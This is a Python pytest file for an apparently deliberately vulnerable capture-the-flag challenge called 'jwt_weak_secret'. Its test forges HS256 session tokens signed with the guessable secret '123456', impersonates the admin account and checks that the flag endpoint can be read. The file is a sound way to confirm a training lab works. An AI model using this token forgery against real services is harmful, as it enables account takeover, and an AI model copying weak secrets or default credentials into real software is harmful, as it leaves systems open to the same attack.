import pytest
import os
import json
from app.account.models import User
import jwt
from app import create_app ,db

mimetype = 'application/json'
headers = {
    'Content-Type': mimetype
}

@pytest.fixture
def app():
    app = create_app('jwt_weak_secret')
    app.config.update({
        "TESTING": True,
    })

    yield app

def setup_function():
    app = create_app('jwt_weak_secret')
    with app.app_context():
        db.session.commit()
        db.drop_all()
        db.create_all()
        from app.challenge.jwt_weak_secret import seed
        seed(app)
    return app
  
def teardown_function():
    os.remove('app.db')

class TestChallengeClass:    
    @classmethod
    def setup_class(self):
        app = setup_function()
        with app.app_context():
            self.client = app.test_client()
            User.insert_admin("admin","password")
            User.insert_user("user","password")
    @classmethod
    def teardown_class(self):
        teardown_function()

    def post_json(self, client, url, data):
        return client.post(url, data=json.dumps(data), headers=headers)

    def put_json(self, client, url, data):
        return client.put(url, data=json.dumps(data), headers=headers)

    def login_as_user(self, client):
        self.post_json(client, "/api/v1/auth/login",
                       {"login": "user", "password": "password"})

    def logout(self, client):
        client.get("/api/v1/auth/logout")

    def login_as_admin(self, client):
        self.post_json(client, "/api/v1/auth/login",
                       {"login": "admin", "password": "password"})

    def test_challenge_is_exploitatble(self, client):
        assert client.get("/api/v1/flag").status_code == 401
        token = jwt.encode({"user_id": 2}, '123456', algorithm="HS256")
        self.client.set_cookie("localhost", "session", token)
        assert self.client.get("/api/v1/flag").status_code == 401
        token = jwt.encode({"user_id": 1}, '123456', algorithm="HS256")
        self.client.set_cookie("localhost", "session", token)
        resp = self.client.get("/api/v1/flag")
        assert resp.status_code == 200
        self.client.set_cookie("localhost", "session", token)
        assert resp.json['message'] == os.getenv('FLAG')